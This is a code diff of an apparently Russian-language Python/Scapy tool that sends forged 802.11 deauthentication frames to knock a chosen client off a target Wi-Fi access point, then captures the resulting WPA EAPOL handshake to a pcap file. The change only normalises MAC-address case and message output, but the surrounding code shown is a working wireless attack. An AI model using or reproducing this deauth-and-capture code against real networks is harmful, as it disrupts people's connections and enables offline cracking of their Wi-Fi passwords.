@@ -23,6 +23,9 @@ parser.add_argument("-s", "--client", required=True, help="MAC-адрес кли
 parser.add_argument("-w", "--pcap-file", required=True, help="Файл для сохранения handshake (например file.pcap)")
 args = parser.parse_args()
 
+bssid = args.bssid.lower()
+client = args.client.lower()
+
 eapol_detect_falg = False
 eapol_start_time = None
 beacon_detect_flag = False
@@ -39,10 +42,10 @@ packet_buff = []
 
 print(f"[+] Switching {args.interface} to channel {args.channel}")
 subprocess.run(["iwconfig", args.interface, "channel", str(args.channel)], capture_output=True, text=True)
-print(f"[+] Waiting beacon frame from {args.bssid}")
+print(f"[+] Waiting beacon frame from {bssid.upper()}")
 
 def send_deauth(iface, bssid, cssid):
-	print(f"[+] Send 10-packet deauth to {bssid} as {cssid}")
+	print(f"[+] Send 10-packet deauth to {bssid.upper()} as {cssid.upper()}")
 	deauth_pkt = RadioTap() / Dot11(addr1=cssid, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
 	
 	for j in range(10):
@@ -64,19 +67,19 @@ def packet_handler(pkt):
 	if pkt.haslayer(Dot11) and pkt.type == 1 and pkt.subtype == 13 and pkt[Dot11].addr1 == args.bssid:
 		acks += 1
 	
-	if pkt.haslayer(Dot11Elt) and pkt[Dot11].addr3 == args.bssid:
+	if pkt.haslayer(Dot11Elt) and pkt[Dot11].addr3 == bssid:
 		if not beacon_detect_flag:
 			#wrpcap(args.pcap_file, pkt)
 			packet_buff.append(pkt)
 			ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else None
 			print(f"[+] Done, ssid=\"{ssid}\"")
-			print(f"[+] Waiting EAPOL frame from {args.bssid}")
+			print(f"[+] Waiting EAPOL frame from {bssid.upper()}")
 			beacon_detect_flag = True
 			
-			deauth_thread = threading.Thread(target=send_deauth, args=(args.interface, args.bssid, args.client))
+			deauth_thread = threading.Thread(target=send_deauth, args=(args.interface, bssid, client))
 			deauth_thread.start()
 			
-	if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3 and (pkt[Dot11].addr1 == args.bssid or pkt[Dot11].addr2 == args.bssid):
+	if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3 and (pkt[Dot11].addr1 == bssid or pkt[Dot11].addr2 == bssid):
 		if not eapol_detect_falg:
 			eapol_detect_falg = True
 			eapol_start_time = time.time()
